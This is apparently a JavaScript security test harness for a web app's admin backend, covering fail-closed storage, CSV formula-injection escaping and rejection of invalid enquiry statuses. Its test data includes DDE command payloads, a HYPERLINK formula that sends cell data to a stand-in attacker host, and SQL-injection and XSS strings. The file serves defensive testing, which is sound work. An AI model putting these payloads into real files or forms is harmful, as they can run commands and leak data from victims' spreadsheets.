import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import assert from 'node:assert';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const durable = require('../server/durableStorage.cjs');
const { handleApiRequest } = require('../server/apiRouter.cjs');
const { readDb, writeDb, SESSION_SECRET } = require('../server/db.cjs');

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const ROOT_DIR = path.resolve(__dirname, '..');
const DB_FILE = path.join(ROOT_DIR, 'data', 'practice_db.json');

console.log('================================================================================');
console.log('    CHALLENGER GATE ADV-2: EMPIRICAL ATTACK HARNESS & DURABILITY PROBE         ');
console.log('================================================================================\n');

let totalChecks = 0;
let passedChecks = 0;
let failedChecks = 0;
const resultsLog = [];

function recordCheck(section, testName, passed, details = {}) {
  totalChecks++;
  if (passed) {
    passedChecks++;
    console.log(`  \x1b[32m✔ [PASS]\x1b[0m [${section}] ${testName}`);
  } else {
    failedChecks++;
    console.log(`  \x1b[31m✖ [FAIL]\x1b[0m [${section}] ${testName}`);
    console.error('    Failure Details:', details);
  }
  resultsLog.push({ section, testName, passed, details });
}

function simulateApi(method, url, headers = {}, body = null, socket = { remoteAddress: '127.0.0.1' }) {
  return new Promise((resolve) => {
    const bodyStr = body ? (typeof body === 'string' ? body : JSON.stringify(body)) : '';
    const bodyBuf = Buffer.from(bodyStr);

    const req = {
      method,
      url,
      headers: {
        'host': 'localhost:5173',
        'content-type': 'application/json',
        'content-length': bodyBuf.length,
        ...headers
      },
      socket,
      connection: socket,
      on: (event, handler) => {
        if (event === 'data' && bodyBuf.length > 0) handler(bodyBuf);
        else if (event === 'end') handler();
        return req;
      }
    };

    let statusCode = 200;
    const resHeaders = {};
    const chunks = [];

    const res = {
      statusCode: 200,
      setHeader: (name, val) => { resHeaders[name.toLowerCase()] = val; },
      writeHead: (code, hdrs) => {
        statusCode = code;
        if (hdrs) Object.entries(hdrs).forEach(([k, v]) => { resHeaders[k.toLowerCase()] = v; });
      },
      end: (chunk) => {
        if (chunk) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
        const rawBody = Buffer.concat(chunks).toString('utf8');
        let json = null;
        try { json = JSON.parse(rawBody); } catch {}
        resolve({
          statusCode: res.statusCode || statusCode,
          headers: resHeaders,
          rawBody,
          json
        });
      }
    };

    handleApiRequest(req, res).catch(err => {
      resolve({ statusCode: 500, headers: {}, rawBody: String(err), json: { error: String(err) } });
    });
  });
}

function issueAdminToken(username = 'admin') {
  const payload = {
    sub: username,
    name: 'Administrator',
    role: 'admin',
    jti: 'challenger-adv-' + crypto.randomBytes(12).toString('hex'),
    iat: Math.floor(Date.now() / 1000) + 10,
    exp: Math.floor(Date.now() / 1000) + 3600
  };
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', SESSION_SECRET).update(payloadB64).digest('base64url');
  return `ka_jwt.${payloadB64}.${sig}`;
}

function getDbFileHash() {
  const content = fs.readFileSync(DB_FILE);
  return {
    size: content.length,
    sha256: crypto.createHash('sha256').update(content).digest('hex')
  };
}

async function runEmpiricalHarness() {
  // Ensure we save a fresh snapshot of the DB before starting
  const baselineDbContent = fs.readFileSync(DB_FILE, 'utf8');
  const baselineStats = getDbFileHash();

  try {
    // =========================================================================
    // VECTOR 1: STRICT_DURABLE_STORAGE=true Fail-Closed Verification
    // =========================================================================
    console.log('--- VECTOR 1: STRICT_DURABLE_STORAGE=true Fail-Closed & Zero Local Bytes Verification ---');
    
    // Disconnect Supabase completely
    delete process.env.SUPABASE_URL;
    delete process.env.SUPABASE_ANON_KEY;
    delete process.env.SUPABASE_SERVICE_ROLE_KEY;
    process.env.STRICT_DURABLE_STORAGE = 'true';

    assert.strictEqual(durable.isDurableConfigured(), false, 'Durable storage must report unconfigured');

    const beforeStats = getDbFileHash();

    // 1.1 saveEnquiry
    const testEnquiry = {
      id: 'ADV-STRICT-ENQ-999',
      fullName: 'Adversarial Fail-Closed Client',
      phone: '+91 99999 00000',
      message: 'Probe for silent ephemeral write under strict mode',
      serviceCategory: 'Direct Tax Audit',
      city: 'Tirupati',
      status: 'new',
      createdAt: new Date().toISOString()
    };
    const resEnquiry = await durable.saveEnquiry(testEnquiry);
    const passEnquiry = resEnquiry.success === false && 
                        typeof resEnquiry.error === 'string' &&
                        resEnquiry.error.includes('CRITICAL: Durable cloud storage is mandatory');
    recordCheck('VECTOR-1', 'saveEnquiry fail-closed in strict mode without Supabase', passEnquiry, { resEnquiry });

    // 1.2 saveService
    const testService = {
      id: 'adv-strict-srv-999',
      title: 'Adversarial Fail-Closed Service',
      shortDescription: 'Probe for silent ephemeral write under strict mode',
      status: 'published',
      order: 99
    };
    const resService = await durable.saveService(testService);
    const passService = resService.success === false && 
                        typeof resService.error === 'string' &&
                        resService.error.includes('CRITICAL: Durable cloud storage is mandatory');
    recordCheck('VECTOR-1', 'saveService fail-closed in strict mode without Supabase', passService, { resService });

    // 1.3 saveFaq
    const testFaq = {
      id: 'adv-strict-faq-999',
      question: 'Adversarial Fail-Closed FAQ Question?',
      answer: 'Probe for silent ephemeral write under strict mode',
      status: 'published',
      order: 99
    };
    const resFaq = await durable.saveFaq(testFaq);
    const passFaq = resFaq.success === false && 
                    typeof resFaq.error === 'string' &&
                    resFaq.error.includes('CRITICAL: Durable cloud storage is mandatory');
    recordCheck('VECTOR-1', 'saveFaq fail-closed in strict mode without Supabase', passFaq, { resFaq });

    // 1.4 saveSettings
    const testSettings = {
      primaryPhone: '+91 99999 99999',
      email: 'hacked-strict@fake-domain.com',
      primaryLocation: 'Nowhere',
      openingHours: 'Never'
    };
    const resSettings = await durable.saveSettings(testSettings);
    const passSettings = resSettings.success === false && 
                         typeof resSettings.error === 'string' &&
                         resSettings.error.includes('CRITICAL: Durable cloud storage is mandatory');
    recordCheck('VECTOR-1', 'saveSettings fail-closed in strict mode without Supabase', passSettings, { resSettings });

    // 1.5 savePost
    const testPost = {
      slug: 'adv-strict-post-999',
      title: 'Adversarial Fail-Closed Article',
      excerpt: 'Probe for silent ephemeral write under strict mode',
      content: '# Heading\nTesting durability hole',
      draft: false
    };
    const resPost = await durable.savePost(testPost);
    const passPost = resPost.success === false && 
                     typeof resPost.error === 'string' &&
                     resPost.error.includes('CRITICAL: Durable cloud storage is mandatory');
    recordCheck('VECTOR-1', 'savePost fail-closed in strict mode without Supabase', passPost, { resPost });

    // 1.6 Additional mutations: updateEnquiryStatus, deleteEnquiry, deleteService, deleteFaq, deletePost, updateUserPassword
    const resUpdEnq = await durable.updateEnquiryStatus('ANY-ID', 'contacted');
    const resDelEnq = await durable.deleteEnquiry('ANY-ID');
    const resDelSrv = await durable.deleteService('ANY-ID');
    const resDelFaq = await durable.deleteFaq('ANY-ID');
    const resDelPost = await durable.deletePost('ANY-SLUG');
    const resUpdPass = await durable.updateUserPassword('admin', 'NewPassword#1234');

    const allMutationsFailed = [resUpdEnq, resDelEnq, resDelSrv, resDelFaq, resDelPost, resUpdPass].every(
      r => r.success === false && typeof r.error === 'string' && r.error.includes('CRITICAL: Durable cloud storage is mandatory')
    );
    recordCheck('VECTOR-1', 'All additional mutation methods fail-closed under strict mode', allMutationsFailed, {
      resUpdEnq, resDelEnq, resDelSrv, resDelFaq, resDelPost, resUpdPass
    });

    // Verify ZERO BYTES were written to practice_db.json
    const afterStats = getDbFileHash();
    const zeroBytesWritten = (afterStats.size === beforeStats.size) && (afterStats.sha256 === beforeStats.sha256);
    
    // Also parse local DB to verify none of the test records exist
    const currentDb = readDb();
    const noEnquiry = !(currentDb.enquiries || []).some(e => e.id === testEnquiry.id);
    const noService = !(currentDb.services || []).some(s => s.id === testService.id);
    const noFaq = !(currentDb.faqs || []).some(f => f.id === testFaq.id);
    const noPost = !(currentDb.posts || []).some(p => p.slug === testPost.slug);
    const noSettingsPollution = currentDb.settings?.primaryPhone !== testSettings.primaryPhone;

    const zeroPersistenceConfirmed = zeroBytesWritten && noEnquiry && noService && noFaq && noPost && noSettingsPollution;

    recordCheck('VECTOR-1', 'ZERO bytes written to practice_db.json (SHA-256 and byte length identical, 0 records added)', zeroPersistenceConfirmed, {
      beforeStats,
      afterStats,
      zeroBytesWritten,
      noEnquiry,
      noService,
      noFaq,
      noPost,
      noSettingsPollution
    });

    // Cleanup env
    delete process.env.STRICT_DURABLE_STORAGE;

    // =========================================================================
    // VECTOR 2: CSV Formula Injection Neutralization
    // =========================================================================
    console.log('\n--- VECTOR 2: CSV Formula Injection Neutralization (CWE-1236) ---');

    // Test the production CSV export function and sanitization rules
    const { build } = await import('vite');
    await build({
      configFile: false,
      logLevel: 'silent',
      build: {
        lib: {
          entry: path.join(ROOT_DIR, 'src', 'services', 'adminStorage.ts'),
          formats: ['es'],
          fileName: () => 'adminStorageTestBundle.mjs'
        },
        outDir: path.join(ROOT_DIR, 'tests', 'temp'),
        emptyOutDir: false,
        rollupOptions: {
          external: ['@supabase/supabase-js']
        }
      }
    });

    const mockStorage = new Map();
    globalThis.window = { addEventListener: () => {}, removeEventListener: () => {}, dispatchEvent: () => {} };
    globalThis.localStorage = {
      getItem: (k) => mockStorage.get(k) || null,
      setItem: (k, v) => mockStorage.set(k, String(v)),
      removeItem: (k) => mockStorage.delete(k),
      clear: () => mockStorage.clear()
    };

    const bundlePath = path.join(ROOT_DIR, 'tests', 'temp', 'adminStorageTestBundle.mjs');
    const bundleModule = await import('file:///' + bundlePath.replace(/\\/g, '/'));
    const adminStorage = bundleModule.adminStorage;
    assert.strictEqual(typeof adminStorage.exportEnquiriesCSV, 'function', 'exportEnquiriesCSV must be exported');

    // Injection attack payloads:
    const dangerousEnquiries = [
      {
        id: 'ENQ-DDE-CMD',
        createdAt: '2026-11-02T10:00:00.000Z',
        status: 'new',
        fullName: "=cmd|' /C calc'!A0",
        entityType: '+HYPERLINK("http://evil-attacker.example.com/exfil?d="&A1)',
        organization: '-2+3',
        phone: '@SUM(1+1)',
        email: '%COMSPEC%',
        serviceCategory: '\t=DDE("cmd";"/C notepad";"__")',
        city: '\r=1+1',
        urgency: 'routine',
        message: '=10+20',
        followUpNotes: '+cmd|"/C whoami"!A0'
      },
      {
        id: 'ENQ-EDGE-PUNCT',
        createdAt: '2026-11-02T10:05:00.000Z',
        status: 'in-progress',
        fullName: '-100',
        entityType: '+91 99999 88888',
        organization: '@org_handle',
        phone: 'Normal Phone',
        email: '=HYPERLINK("evil.com")',
        serviceCategory: 'Taxation, "Specialized" & Advisory',
        city: 'Multi-line\n=calc\nTest',
        urgency: 'high',
        message: '"Double Quoted" String',
        followUpNotes: '=cmd'
      }
    ];

    mockStorage.set('ka_admin_enquiries_v1', JSON.stringify(dangerousEnquiries));
    const generatedCSV = adminStorage.exportEnquiriesCSV();

    // Verify CSV output lines
    const lines = generatedCSV.split('\n');
    assert.ok(lines.length >= 3, `Expected at least header + 2 rows, got ${lines.length} lines`);

    const headers = lines[0];
    assert.strictEqual(headers, 'ID,Date,Status,Full Name,Entity Type,Organization,Phone,Email,Service Category,City,Urgency,Message,Follow-Up Notes');

    // Individual checks for dangerous formula characters
    const checks = [
      { name: "Neutralizes '=' prefix with single-quote", raw: "=cmd|' /C calc'!A0", search: "\"'=cmd|' /C calc'!A0\"" },
      { name: "Neutralizes '+' formula hyperlink with single-quote and quote escaping", raw: '+HYPERLINK("http://evil-attacker.example.com/exfil?d="&A1)', search: "\"'+HYPERLINK(\"\"http://evil-attacker.example.com/exfil?d=\"\"&A1)\"" },
      { name: "Neutralizes '-' prefix with single-quote", raw: '-2+3', search: "\"'-2+3\"" },
      { name: "Neutralizes '@' formula prefix with single-quote", raw: '@SUM(1+1)', search: "\"'@SUM(1+1)\"" },
      { name: "Neutralizes '%' env var prefix with single-quote", raw: '%COMSPEC%', search: "\"'%COMSPEC%\"" },
      { name: "Neutralizes tab character '\\t' formula starter", raw: '\t=DDE("cmd";"/C notepad";"__")', search: "\"'\t=DDE(\"\"cmd\"\";\"\"/C notepad\"\";\"\"__\"\")\"" },
      { name: "Neutralizes carriage return '\\r' formula starter", raw: '\r=1+1', search: "\"'\r=1+1\"" },
      { name: "Neutralizes negative number starting with '-'", raw: '-100', search: "\"'-100\"" },
      { name: "Neutralizes phone number starting with '+'", raw: '+91 99999 88888', search: "\"'+91 99999 88888\"" },
      { name: "Neutralizes message field formula '=10+20'", raw: '=10+20', search: "\"'=10+20\"" },
      { name: "Neutralizes follow-up notes formula '+cmd|...'", raw: '+cmd|"/C whoami"!A0', search: "\"'+cmd|\"\"/C whoami\"\"!A0\"" }
    ];

    let allFormulaeNeutralized = true;
    for (const c of checks) {
      const found = generatedCSV.includes(c.search);
      if (!found) {
        allFormulaeNeutralized = false;
        console.error(`Missing expected sanitized fragment: ${c.search}`);
      }
      recordCheck('VECTOR-2', c.name, found, { expected: c.search });
    }

    // Verify that NO cell in the CSV begins with an unescaped dangerous character:
    // Regex matches any cell value after comma or start of line that is `"=...`, `"+...`, `"-...`, `"@...`, `"%...`
    const unescapedFormulaTrigger = /(?:^|,)"[=+\-@%\t\r]/m;
    const hasUnescapedFormula = unescapedFormulaTrigger.test(generatedCSV);
    recordCheck('VECTOR-2', 'Regex scan: Zero unescaped dangerous formula triggers in CSV output', !hasUnescapedFormula, {
      hasUnescapedFormula
    });

    // =========================================================================
    // VECTOR 3: Status Enum Validation
    // =========================================================================
    console.log('\n--- VECTOR 3: Enquiry Status Enum Validation (HTTP 400 Rejection) ---');

    const adminToken = issueAdminToken('admin');

    // Seed a valid enquiry for status testing
    const statusTestEnquiry = {
      id: 'ENQ-STATUS-PROBE-01',
      fullName: 'Status Validation Test Subject',
      phone: '+91 95421 53906',
      message: 'Probe for status enum constraints',
      serviceCategory: 'Direct Tax',
      city: 'Tirupati',
      status: 'new',
      createdAt: new Date().toISOString()
    };
    const dbForStatus = readDb();
    dbForStatus.enquiries = dbForStatus.enquiries || [];
    dbForStatus.enquiries.unshift(statusTestEnquiry);
    writeDb(dbForStatus);

    // 3.1 Probing with invalid statuses via API:
    const invalidStatusesToTest = [
      'hacked',
      'invalid_status',
      'pending',
      'approved',
      'rejected',
      'archived',
      'deleted',
      'in-review',
      'NEW',
      'CLOSED',
      '',
      '   ',
      'closed; DROP TABLE enquiries;--',
      '<script>alert(1)</script>'
    ];

    let allInvalidRejected = true;
    for (const badStatus of invalidStatusesToTest) {
      const res = await simulateApi(
        'PATCH',
        `/api/admin/enquiries/${statusTestEnquiry.id}`,
        {
          'authorization': `Bearer ${adminToken}`,
          'origin': 'https://kavithaassociates.com'
        },
        { status: badStatus }
      );

      const rejectedWith400 = res.statusCode === 400 && 
                             res.json?.success === false &&
                             typeof res.json?.error === 'string' &&
                             res.json.error.includes('Status must be one of: new, contacted, in-progress, closed');
      
      if (!rejectedWith400) {
        allInvalidRejected = false;
        console.error(`Failed to reject bad status '${badStatus}': statusCode=${res.statusCode}`, res.json);
      }
      recordCheck('VECTOR-3', `Rejection of invalid status '${badStatus}' with HTTP 400`, rejectedWith400, {
        badStatus,
        statusCode: res.statusCode,
        error: res.json?.error
      });
    }

    // 3.2 Direct durable storage method probe with invalid status
    const directDurableRes = await durable.updateEnquiryStatus(statusTestEnquiry.id, 'hacked');
    const directDurableRejected = directDurableRes.success === false && 
                                 typeof directDurableRes.error === 'string' &&
                                 directDurableRes.error.includes("Invalid status 'hacked'");
    recordCheck('VECTOR-3', "Direct durableStorage.updateEnquiryStatus rejects 'hacked'", directDurableRejected, { directDurableRes });

    // 3.3 Verify valid enum statuses succeed via API:
    const validStatuses = ['contacted', 'in-progress', 'closed', 'new'];
    let allValidAccepted = true;
    for (const goodStatus of validStatuses) {
      const res = await simulateApi(
        'PATCH',
        `/api/admin/enquiries/${statusTestEnquiry.id}`,
        {
          'authorization': `Bearer ${adminToken}`,
          'origin': 'https://kavithaassociates.com'
        },
        { status: goodStatus, followUpNotes: `Status changed to ${goodStatus} by challenger` }
      );

      const acceptedWith200 = res.statusCode === 200 &&
                             res.json?.success === true &&
                             res.json?.enquiry?.status === goodStatus;

      if (!acceptedWith200) {
        allValidAccepted = false;
        console.error(`Failed to accept valid status '${goodStatus}': statusCode=${res.statusCode}`, res.json);
      }
      recordCheck('VECTOR-3', `Acceptance of valid status '${goodStatus}' with HTTP 200`, acceptedWith200, {
        goodStatus,
        statusCode: res.statusCode,
        returnedStatus: res.json?.enquiry?.status
      });
    }

    // Clean up status test enquiry
    const cleanDb = readDb();
    cleanDb.enquiries = (cleanDb.enquiries || []).filter(e => e.id !== statusTestEnquiry.id);
    writeDb(cleanDb);

  } finally {
    // Restore initial baseline DB content
    fs.writeFileSync(DB_FILE, baselineDbContent, 'utf8');
    try {
      fs.rmSync(path.join(ROOT_DIR, 'tests', 'temp'), { recursive: true, force: true });
    } catch {}
  }

  console.log('\n================================================================================');
  console.log(`TOTAL EMPIRICAL HARNESS CHECKS : ${totalChecks}`);
  console.log(`PASSED                         : ${passedChecks}`);
  console.log(`FAILED                         : ${failedChecks}`);
  console.log('================================================================================\n');

  if (failedChecks > 0) {
    process.exit(1);
  }
}

runEmpiricalHarness().catch(err => {
  console.error('Fatal execution error:', err);
  process.exit(1);
});
